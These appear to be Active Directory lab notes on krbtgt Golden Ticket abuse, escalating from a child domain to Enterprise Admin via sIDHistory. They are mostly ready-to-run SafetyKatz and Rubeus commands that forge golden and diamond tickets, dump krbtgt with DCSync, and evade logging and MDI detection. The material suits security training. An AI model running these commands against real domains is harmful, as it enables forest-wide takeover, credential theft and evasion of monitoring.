**KRBTGT Secret Abuse** (widely known as a **Golden Ticket Attack**) is a post-exploitation technique where an attacker, after compromising the `krbtgt` account hash, forges Kerberos Ticket Granting Tickets (TGTs). This provides a "master key" to the entire domain, allowing the attacker to impersonate any user and maintain persistent access.

### Detailed Explanation

- **The KRBTGT Account:** Every Active Directory domain has a `krbtgt` account. Its password hash is used by the Key Distribution Center (KDC) to encrypt and sign all TGTs.
- **The Vulnerability:** If you have the `krbtgt` hash, you can create your own TGTs from scratch. Since the DC uses the `krbtgt` hash to "verify" the ticket, it will trust any ticket you forge.
- **sIDHistory Escalation:** In a multi-domain forest, you can add the **Enterprise Admin** SID to the `sIDHistory` field of a forged ticket in a child domain. When you present this ticket to a parent domain, it sees the EA SID and grants you forest-wide administrative rights.
- **Persistence:** Even if a user changes their password, a Golden Ticket remains valid until the `krbtgt` password is reset **twice** (AD keeps the last two passwords).

## Diagram 

```
Priv Esc - Enterprise Admins - krbtgt Secret Abuse
    ==================================================

      [ CHILD DOMAIN ]          TRUST BOUNDARY         [ PARENT DOMAIN ]
             |                        |                       |
      +--------------+                |                +--------------+
      |   Child DC   | <------ (Implicit Trust) -----> |   Parent DC  |
      +--------------+                |                +--------------+
             ^                        |                ^      |
             |                        |                |      |
      (1) AS-REQ (User)               |        (5) Present Inter-realm TGT
      (2) AS-REP (TGT)                |        (6) Issue ST (if validated)
             |                        |                |      |
             v                        |                v      v
      +--------------+                |                +--------------+
      |    CLIENT    | ------------------------------> |  APP SERVER  |
      |  (Attacker)  |         (7) Present ST          +--------------+
      +--------------+                                 
             ^
             | [ ATTACK STEPS ]
             | i.  Acquire AES key of the child krbtgt account
             | ii. Forge TGT using AES key to get desired privileges
```

--- 

This is easier!
We need to simply forge a Golden ticket (not an inter-realm TGT) with sIDHistory of the Enterprise Admins group.

• Due to the trust, the parent domain will trust the TGT.
```
SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

* Avoid suspicious logs and bypass MDI by using Domain Controller identity
```
SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

```
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

> S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers
   S-1-5-9 - Enterprise Domain Controllers

* Avoid suspicious logs and bypass MDI by using Domain Controller identity (using Rubeus)
```
Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb
5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt
```

```
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

* Diamond ticket with SID History will avoid suspicious logs on child DC and parent DC. Also bypasses MDI:
```
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-
335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

